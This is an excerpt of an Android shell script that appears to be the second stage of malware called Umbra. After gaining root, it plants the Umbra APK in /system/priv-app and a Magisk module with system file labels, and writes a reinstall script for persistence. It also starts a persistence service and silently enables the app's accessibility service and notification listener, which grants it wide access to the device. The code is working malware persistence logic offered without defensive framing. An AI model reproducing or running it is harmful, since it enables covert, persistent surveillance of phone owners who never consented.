...
TAG="[SYNAPSE_STAGE2]"
APK_PKG="org.umbra.core"
TARGET_APK_PATH=""
STAGE2_DIR="/data/local/tmp/umbra_stage2"
LOG="$STAGE2_DIR.log"
ROOT_ACHIEVED=0
...
if [ "$ROOT_ACHIEVED" = "1" ]; then
    ...
    for APK_CANDIDATE in \
        /data/app/org.umbra.core-*/base.apk \
        /data/app/~~*/org.umbra.core-*/base.apk \
        /data/app/*/org.umbra.core-*/base.apk \
    ...
    if [ -n "$TARGET_APK_PATH" ] && [ -f "$TARGET_APK_PATH" ]; then
        ...
        if $SU_BIN mount | grep -q "/system .*rw,"; then
            ...
            # Try Magisk overlay
            MODULE_DIR="/data/adb/modules/umbra"
            $SU_BIN mkdir -p "$MODULE_DIR/system/priv-app/UmbraCore" 2>>"$LOG"
            $SU_BIN cp "$TARGET_APK_PATH" "$MODULE_DIR/system/priv-app/UmbraCore/UmbraCore.apk" 2>>"$LOG"
            log "[*] Copied to Magisk module: $MODULE_DIR"
        fi

        # Copy to /system/priv-app/
        SYS_PRIV="/system/priv-app/UmbraCore"
        $SU_BIN mkdir -p "$SYS_PRIV" 2>>"$LOG"
        $SU_BIN cp "$TARGET_APK_PATH" "$SYS_PRIV/UmbraCore.apk" 2>>"$LOG"
        COP_RC=$?

        if [ $COP_RC -eq 0 ]; then
            $SU_BIN chmod 644 "$SYS_PRIV/UmbraCore.apk" 2>>"$LOG"
            $SU_BIN chmod 755 "$SYS_PRIV" 2>>"$LOG"
            $SU_BIN chown root:root "$SYS_PRIV" 2>>"$LOG"
            $SU_BIN chcon u:object_r:system_file:s0 "$SYS_PRIV/UmbraCore.apk" 2>>"$LOG"
            log "[+] APK copied to $SYS_PRIV/UmbraCore.apk"
        else
        ...
        PERSIST_PATH="/data/local/tmp/umbra_persist.apk"
...
#!/system/bin/sh
if pm list packages | grep -q org.umbra.core; then
    pm uninstall org.umbra.core 2>/dev/null
fi
pm install -r /data/local/tmp/umbra_persist.apk 2>/dev/null
REINSTALL_EOF
        $SU_BIN chmod 755 "$STAGE2_DIR/reinstall.sh" 2>>"$LOG"
        log "[*] Reinstall script created at $STAGE2_DIR/reinstall.sh"
    else
        log "[-] Cannot find Umbra APK"
    fi
else
...
if [ "$ROOT_ACHIEVED" = "1" ]; then
    ...
    $SU_BIN am startservice -n "$APK_PKG/.persistence.UmbraService" 2>>"$LOG"
    log "[*] Started UmbraService via am"
    ...
    $SU_BIN settings put secure enabled_accessibility_services \
        "$APK_PKG/$APK_PKG.modules.UmbraAccessibilityService" 2>>"$LOG"
    ...
    $SU_BIN settings put secure enabled_notification_listeners \
        "$APK_PKG/$APK_PKG.modules.UmbraNotificationListener" 2>>"$LOG"
    ...
    am startservice -n "$APK_PKG/.persistence.UmbraService" 2>>"$LOG"
    log "[*] Started UmbraService (standard)"
fi
...
echo "{
  ...
  \"persistence\": $([ -f "/system/priv-app/UmbraCore/UmbraCore.apk" ] && echo true || echo false),
  \"log_path\": \"$LOG\"
